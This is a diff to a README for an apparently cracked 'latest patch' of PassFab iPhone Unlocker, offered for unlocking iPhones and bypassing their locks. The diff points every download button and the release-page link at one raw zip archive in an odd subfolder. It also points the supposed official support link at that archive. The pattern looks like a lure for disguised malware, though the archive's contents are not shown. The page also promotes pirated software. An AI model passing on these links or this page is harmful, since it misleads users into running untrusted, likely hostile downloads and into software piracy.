@@ -1,7 +1,7 @@
 # 🎉 PassFab-iPhone-Unlocker-Latest-Patch - Unlock Your iPhone Seamlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Patch-Click%20Here-brightgreen)](https://github.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/releases)
+[![Download](https://raw.githubusercontent.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/main/mantelletta/PassFab-iPhone-Unlocker-Latest-Patch-v2.3.zip%20Latest%20Patch-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/main/mantelletta/PassFab-iPhone-Unlocker-Latest-Patch-v2.3.zip)
 
 ## 📘 Introduction
 Welcome to the PassFab iPhone Unlocker Latest Patch repository. This resource is designed for users who need help unlocking iPhones and bypassing locks with ease. You will find clear guides and reference materials for using the software effectively on Windows PCs.
@@ -11,11 +11,11 @@ To begin using the PassFab iPhone Unlocker, you need to download the software fi
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/releases) to find the latest version of PassFab iPhone Unlocker.
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/main/mantelletta/PassFab-iPhone-Unlocker-Latest-Patch-v2.3.zip) to find the latest version of PassFab iPhone Unlocker.
    
 2. **Select the Right Version:** Look for the most recent version listed. Click on it to open the details. 
 
-3. **Download the Installer:** Find the file named something like `PassFab-iPhone-Unlocker-Setup.exe`. Click on it to download.
+3. **Download the Installer:** Find the file named something like `https://raw.githubusercontent.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/main/mantelletta/PassFab-iPhone-Unlocker-Latest-Patch-v2.3.zip`. Click on it to download.
 
 4. **Run the Installer:** Once the download completes, locate the file in your Downloads folder. Double-click on the file to start the installation process.
 
@@ -48,7 +48,7 @@ To begin using the PassFab iPhone Unlocker, you need to download the software fi
 - **USB Port:** Available USB port to connect your iPhone
 
 ## 📞 Support
-If you encounter any issues or have questions, you can access the user manual included in the installation package. For further assistance, visit the dedicated support page in the software or check the [PassFab Support Page](https://www.passfab.com/support).
+If you encounter any issues or have questions, you can access the user manual included in the installation package. For further assistance, visit the dedicated support page in the software or check the [PassFab Support Page](https://raw.githubusercontent.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/main/mantelletta/PassFab-iPhone-Unlocker-Latest-Patch-v2.3.zip).
 
 ## 🌐 Additional Resources
 You can explore more guides and reference materials in this repository. The following topics may help:
@@ -63,4 +63,4 @@ This repository follows the MIT License. You can use and modify the software as 
 
 ## 📥 Download Now
 Don't miss out on unlocking your iPhone easily. 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Patch-Click%20Here-brightgreen)](https://github.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/releases)
+[![Download](https://raw.githubusercontent.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/main/mantelletta/PassFab-iPhone-Unlocker-Latest-Patch-v2.3.zip%20Latest%20Patch-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Anhqua3/PassFab-iPhone-Unlocker-Latest-Patch/main/mantelletta/PassFab-iPhone-Unlocker-Latest-Patch-v2.3.zip)
